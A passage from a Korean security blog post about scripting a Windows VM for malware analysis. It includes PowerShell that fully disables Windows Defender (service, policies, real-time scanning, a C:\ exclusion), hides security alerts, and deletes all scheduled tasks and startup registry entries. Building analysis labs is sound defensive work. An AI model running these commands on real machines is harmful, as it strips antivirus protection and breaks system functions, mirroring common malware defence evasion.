Defender&quot;</span>    <span class="hljs-keyword">try</span>    &#123;        <span class="hljs-built_in">Get-Service</span> WinDefend | <span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-Force</span>        <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Start&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">4</span> <span class="hljs-literal">-Type</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    &#125;    <span class="hljs-keyword">catch</span>    &#123;        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed disable WinDefend Service&quot;</span>    &#125;    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Windows Defender&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableAntiSpyware&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableRoutinelyTakingAction&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Spynet&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SpyNetReporting&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SubmitSamplesConsent&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;MRT&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\MRT&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DontReportInfectionInformation&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">-Not</span> ((<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Class</span> Win32_OperatingSystem).Version <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;6.1.7601&quot;</span>))    &#123;        <span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableArchiveScanning</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBehaviorMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBlockAtFirstSeen</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupQuickScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIntrusionPreventionSystem</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIOAVProtection</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRemovableDriveScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRestorePoint</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningMappedNetworkDrivesForFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningNetworkFiles</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScriptScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableControlledFolderAccess</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableNetworkProtection</span> AuditMode <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-MAPSReporting</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-SubmitSamplesConsent</span> NeverSend <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-PUAProtection</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        &#125;&#125;</code></pre><p>WinDefend Serviceì˜ ê²½ìš° ì—ëŸ¬ê°€ ëœ¨ëŠ” ê²½ìš°ê°€ ë§ì•„ try-catch ì²˜ë¦¬ë¥¼ í•˜ì˜€ê³ , ë§ˆì´í¬ë¡œì†Œí”„íŠ¸ì— ë¦¬í¬íŠ¸ë¥¼ ë³´ë‚´ëŠ” ê²ƒ, ê·¸ë¦¬ê³  OS ë²„ì „ì´ 6.1.7601 (Windows 7 Service Pack 1)ì´ ì•„ë‹ ê²½ìš° (Windows 10ì¼ ê²½ìš°ì¸ ê²ƒ ê°™ìŠµë‹ˆë‹¤.) Defenderì— ì¶”ê°€ëœ ë‹¤ë¥¸ ì„¤ì •ë“¤ì„ ë¹„í™œì„±í™”í•´ì¤ë‹ˆë‹¤.</p><p>ì†ŒìŠ¤ ì½”ë“œë¥¼ ê°€ì ¸ì™€ì„œ ì½ìœ¼ë©´ì„œ ëŠë‚€ ê±´ Windows 7 Service Pack 1ë¡œ ê²€ì‚¬í•˜ëŠ” ê²Œ ì•„ë‹ˆë¼ Windows 10ê³¼ Server 2019ì— ëŒ€í•œ Defender ëª…ë ¹ì–´ì¸ ê²ƒ ê°™ì€ë° <code>[System.Envrionment]::OSVersion.Version.Major -eq 10</code>ìœ¼ë¡œ Windows 10ì¸ì§€ í™•ì¸í•˜ë©´ ë˜ì§€ ì•Šë‚˜? ì‹¶ì—ˆìŠµë‹ˆë‹¤.</p><p>ì‚¬ì‹¤ìƒ ì €ëŠ” Windows 10 ê¸°ì¤€ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í–ˆì§€ë§Œìš”.</p><h1 id="ë³´ì•ˆ-ìœ ì§€-ì •ì±…-ì•Œë¦¼-ë¹„í™œì„±í™”"><a href="#ë³´ì•ˆ-ìœ ì§€-ì •ì±…-ì•Œë¦¼-ë¹„í™œì„±í™”" class="headerlink" title="ë³´ì•ˆ ìœ ì§€ ì •ì±… ì•Œë¦¼ ë¹„í™œì„±í™”"></a>ë³´ì•ˆ ìœ ì§€ ì •ì±… ì•Œë¦¼ ë¹„í™œì„±í™”</h1><p>ë³´ì•ˆ ìœ ì§€ ì •ì±… ì•Œë¦¼ ì•„ì´ì½˜ ë¹„í™œì„±í™”ì…ë‹ˆë‹¤. ì´ê±´ êµ³ì´ í•„ìš” ì—†ì–´ ë³´ì´ê¸´ í•˜ì§€ë§Œ ì €ëŠ” ë¹¨ê°„ ë¶ˆì´ ë– ìˆë‹¤ê±°ë‚˜ ëŠë‚Œí‘œê°€ ë– ìˆë‹¤ê±°ë‚˜ í•˜ë©´ ì‹ ê²½ì´ êµ‰ì¥íˆ ë§ì´ ì“°ì´ëŠ” ì‚¬ëŒì´ê¸°ì—â€¦</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%201.png"></p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;HideSCAHealth&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p>ì°¾ì•„ë³´ì•˜ë”ë‹ˆ Microsoft Policiesì— <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">HideSCAHealth ë ˆì§€ìŠ¤íŠ¸ë¦¬</a>ì— í•´ë‹¹ ë¶€ë¶„ì„ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œì•˜ìŠµë‹ˆë‹¤! ì˜¤ì˜ˆ ë°”ë¡œ ì„¤ì •í•˜ì£ ! <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer</code>ì— <code>HideSCAHealth</code>ì˜ ê°’ì„ 1ë¡œ í•˜ë©´ í•´ë‹¹ í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ë³´ì•ˆ ì•Œë¦¼ ì„¤ì •ì´ ìˆ¨ê²¨ì§‘ë‹ˆë‹¤!</p><h1 id="ì‘ì—…-ìŠ¤ì¼€ì¤„ëŸ¬-ì‚­ì œ"><a href="#ì‘ì—…-ìŠ¤ì¼€ì¤„ëŸ¬-ì‚­ì œ" class="headerlink" title="ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ ì‚­ì œ"></a>ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ ì‚­ì œ</h1><p>ì´ì œ Windowsì— ê¸°ë³¸ì ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆê±°ë‚˜, ë‹¤ë¥¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì¶”ê°€í•˜ë©´ì„œ ë“±ë¡ëœ ë¶ˆí•„ìš”í•œ ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ë¥¼ ì‚­ì œí•  ì‹œê°„ì…ë‹ˆë‹¤.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%202.png"></p><p>ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ì— í‘œì‹œëœ ì´ ë…€ì„ë“¤ì„ ì‚­ì œë¥¼ í•˜ëŠ” ê±°ì£ . ì´ ì‘ì—…ì—” ë¹„í•˜ì¸ë“œ ì—í”¼ì†Œë“œê°€ ìˆìŠµë‹ˆë‹¤. Task ë¦¬ìŠ¤íŠ¸ë¥¼ ê°€ì ¸ì™€ì„œ ëª¨ë‘ ì‚­ì œë¥¼ í•´ë²„ë¦¬ë©´ ë  ê±°ë¼ ìƒê°í–ˆì–´ìš”. ì € ë¶€ë¶„ì— ìˆëŠ” ì¹œêµ¬ë“¤ë§Œ ê°€ì ¸ì˜¨ë‹¤ê³  ìƒê°í–ˆìŠµë‹ˆë‹¤.</p><p>ê·¼ë° í…ŒìŠ¤íŠ¸ë¥¼ í•˜ëŠ”ë°â€¦ Windows ê¸°ëŠ¥ì´ ì •ìƒì ìœ¼ë¡œ ë™ì‘ ì•ˆ í•˜ëŠ” ê²Œ ìˆëŠ” ê±°ì—ìš”â€¦ ê²€ìƒ‰ì´ ì•ˆ ë˜ê³ â€¦ ì™œ ì´ëŸ¬ì§€? ì™œ ì´ëŸ¬ì§€? ì–´ë””ê°€ ë¬¸ì œì§€? í•˜ë©´ì„œ í•¨ìˆ˜ í˜¸ì¶œì„ í•˜ë‚˜í•˜ë‚˜ ì£¼ì„ ì²˜ë¦¬í•˜ë‹¤ê°€ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove_task</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$TS</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> Schedule.Service    <span class="hljs-variable">$TS</span>.Connect(<span class="hljs-variable">$env:COMPUTERNAME</span>)    <span class="hljs-variable">$TaskFolder</span> = <span class="hljs-variable">$TS</span>.GetFolder(<span class="hljs-string">&#x27;\&#x27;</span>)    <span class="hljs-variable">$Tasks</span> = <span class="hljs-variable">$TaskFolder</span>.GetTasks(<span class="hljs-number">1</span>)    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Task</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Tasks</span>)    &#123;        <span class="hljs-variable">$TaskFolder</span>.DeleteTask(<span class="hljs-variable">$Task</span>.Name, <span class="hljs-number">0</span>)    &#125;&#125;</code></pre><p>remove taskëŠ” ComObjectë¥¼ í†µí•´ Schedule.Serviceì—ì„œ Task ë¦¬ìŠ¤íŠ¸ë¥¼ ê°€ì ¸ì™€ì„œ ì‚­ì œë¥¼ í•´ì¤ë‹ˆë‹¤. ì‹œìŠ¤í…œ ìŠ¤ì¼€ì¤„ê¹Œì§€ ëª¨ë‘ ì‚­ì œí•´ë²„ë ¤ì„œ ë°œìƒí•œ í•´í”„ë‹ì´ì—ˆìŠµë‹ˆë‹¤. ã…œ.ã…œ</p><h1 id="ì‹œì‘-í”„ë¡œê·¸ë¨-ì‚­ì œ"><a href="#ì‹œì‘-í”„ë¡œê·¸ë¨-ì‚­ì œ" class="headerlink" title="ì‹œì‘ í”„ë¡œê·¸ë¨ ì‚­ì œ"></a>ì‹œì‘ í”„ë¡œê·¸ë¨ ì‚­ì œ</h1><p>ì•…ì„±ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê³ , ì–´ë–¤ ê²ƒë“¤ì´ autorun ë˜ëŠ”ì§€ í™•ì¸í•  ë•Œ ì—¬ëŸ¬ ì¡ë‹¤í•œ í”„ë¡œê·¸ë¨ë“¤ì´ ì‹¤í–‰ë˜ë©´ ë³´ê¸° í˜ë“¤ê² ì£ ? ê·¸ë˜ì„œ ì´ê²ƒ ë˜í•œ ì§€ì›Œë²„ë¦½ì‹œë‹¤!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_startup</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$user</span> = <span class="hljs-built_in">New-Object</span> System.Security.Principal.NTAccount(<span class="hljs-variable">$env:username</span>)    <span class="hljs-variable">$sid</span> = (<span class="hljs-variable">$user</span>.Translate([<span class="hljs-type">System.Security.Principal.SecurityIdentifier</span>])).Value    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\<span class="hljs-variable">$sid</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>&#125;</code></pre><p>íŠ¹ì • ì‚¬ìš©ìì— í•œí•´ ë“±ë¡ëœ ì‹œì‘ í”„ë¡œê·¸ë¨ì€ ê·¸ ì‚¬ìš©ìì˜ SID ê²½ë¡œë¥¼ í†µí•´ ì €ì¥ì´ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ìì— ë”°ë¥¸ SID ê°’ì„ ê°€ì ¸ì™€ì„œ ì‚­ì œë¥¼ í•´ì£¼ëŠ” ê±°ì£ ! ì¼ë‹¨ì€â€¦ ì €ë ‡ê²Œ ì§€ì •ì„ í–ˆëŠ”ë° ì•ˆ ì§€ì›Œì§€ëŠ” ê²ƒë“¤ì´ ìˆë”ë¼êµ¬ìš”â€¦??? ì´ìœ ë¥¼â€¦ ëª» ì°¾ê² ì–´ì„œ ë‚¨ì•„ìˆëŠ” ê±°ëŠ” ì†ìœ¼ë¡œ ì§€ì› ìŠµë‹ˆë‹¤.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%203.png"></p><p>ìµœì¢…ë³¸ì„ ê°€ì ¸ì˜¬ ë•ŒëŠ” ê¼­ ìˆ˜ì •í•´ì„œ ê°€ì ¸ì˜¬ê²Œìš”! ì´ë²ˆë§Œ ë„ˆê·¸ëŸ¬ì´ ë´ì£¼ì‹œë©´â€¦</p><h1 id="ìˆ¨ê¹€-íŒŒì¼-í‘œì‹œ"><a href="#ìˆ¨ê¹€-íŒŒì¼-í‘œì‹œ" class="headerlink" title="ìˆ¨ê¹€ íŒŒì¼ í‘œì‹œ"></a>ìˆ¨ê¹€ íŒŒì¼ í‘œì‹œ</h1><p>ì´ì œ ìˆ¨ê¹€ íŒŒì¼ê³¼ ì‹œìŠ¤í…œ ìˆ¨ê¹€ íŒŒì¼ë“¤ì„ í‘œì‹œí•´ë´…ì‹œë‹¤. ì„¤ì¹˜í•˜ê³  ìˆ¨ê¹€ íŒŒì¼ì„ ì²´í¬í•˜ê³  í•˜ëŠ” ê²ƒ ë˜í•œ ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ í†µí•´ì„œ ì‘ì—…í•  ìˆ˜ ìˆì–´ìš”. WindowsëŠ” ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ í†µí•´ì„œ ì´ê²ƒì €ê²ƒ ì„¤ì •í•˜ë‹ˆê¹Œìš”.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Hidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ShowSuperHidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p><code>Hidden</code>ê³¼ <code>ShowSuperHidden</code>ì˜ ê°’ì„ 1ë¡œ ì„¤ì •í•´ì£¼ë©´ ëì…ë‹ˆë‹¤! ì´ì œ ê¸°ë³¸ì ì¸ ì„¤ì •ì€ ì™„ë£Œë˜ì—ˆì–´ìš”.</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p>ê°„ë‹¨í•œ Windows ì„¤ì •ì„ ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‘ì„±í•´ë³´ì•˜ìŠµë‹ˆë‹¤. ì†ìœ¼ë¡œ í•´ë„ ì–¼ë§ˆ ì•ˆ ê±¸ë¦¬ì§€ë§Œ, ê°€ë” ëª‡ ê°œ ê¹Œë¨¹ì„ ë•Œë„ ìˆê³  ê·€ì°®ì–ì•„ìš”? ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‘ì„±í•˜ë©´ ì‹¤í–‰ë§Œ í•˜ë©´ ì´ ëª¨ë“  ê²ƒë“¤ì„ <del>ë¬´ë£Œ!</del> ê¹Œë¨¹ì€ ê±° ì—†ì´ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë‹¤ìŒ íŒŒíŠ¸ì—ì„œ chocolateyë¥¼ í†µí•´ì„œ ì—¬ëŸ¬ ê°€ì§€ íˆ´ë“¤ì„ ì„¤ì¹˜í•˜ê³  ê°œì¸ì˜ ì…ë§›ì— ë§ê²Œ ì‘ì—… í‘œì‹œì¤„ì— ì¶”ê°€, ë°”íƒ•í™”ë©´ ë°”ë¡œê°€ê¸° ë§Œë“¤ê¸° ë“±ì— ëŒ€í•´ì„œ ì•Œì•„ë´…ì‹œë‹¤. ë‹¤ìŒ íŒŒíŠ¸ê°€ ëª¨ë‘ ì§„í–‰ë˜ê³  ë‚˜ë©´ ì „ì²´ ì†ŒìŠ¤ ì½”ë“œë¥¼ githubì— ì˜¬ë ¤ì„œ ë§í¬ë¥¼ ê±¸ì–´ë“œë¦¬ê² ìŠµë‹ˆë‹¤! ë§ˆì§€ë§‰ìœ¼ë¡œ í•´ë‹¹ ê¸°ëŠ¥ë“¤ì„ êµ¬í˜„í•  ë•Œ ì°¸ê³  ë§í¬ë“¤ì„ ì‘ì„±í•˜ë©° ì´ë§Œ ë¬¼ëŸ¬ê°€ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ì•ˆë‡½~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>disableÂ securityÂ maintenanceÂ icon: <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.TaskBar2::HideSCAHealth</a></p><p>show hidden files: <a href="https://www.python2.net/questions-1237399.htm">https://www.python2.net/questions-1237399.htm</a></p><p>remove app list: <a href="https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list">https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list</a></p><p>disable windows defender: <a href="https://github.com/fireeye/flare-vm/blob/master/install.ps1">https://github.com/fireeye/flare-vm/blob/master/install.ps1</a></p><p>disable windows update: <a href="https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell">https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell</a></p><p>get specific sid: <a href="https://techexpert.tips/powershell/powershell-get-user-sid/">https://techexpert.tips/powershell/powershell-get-user-sid/</a></p><p>remove all registry key under specific key: <a href="https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key">https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key</a></p><p>remove task: <a href="https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell">https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/powershell/">powershell</category>
      
      <category domain="https://hackyboiz.github.io/tags/automated/">automated</category>
      
      <category domain="https://hackyboiz.github.io/tags/virtual-machine/">virtual machine</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/06/idioth/setting_malware_vm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</title>
      <link>https://hackyboiz.github.io/2021/06/06/j0ker/2021-06-06/</link>
      <guid>https://hackyboiz.github.io/2021/06/06/j0ker/2021-06-06/</guid>
      <pubDate>Sun, 06 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
        
      
      
      
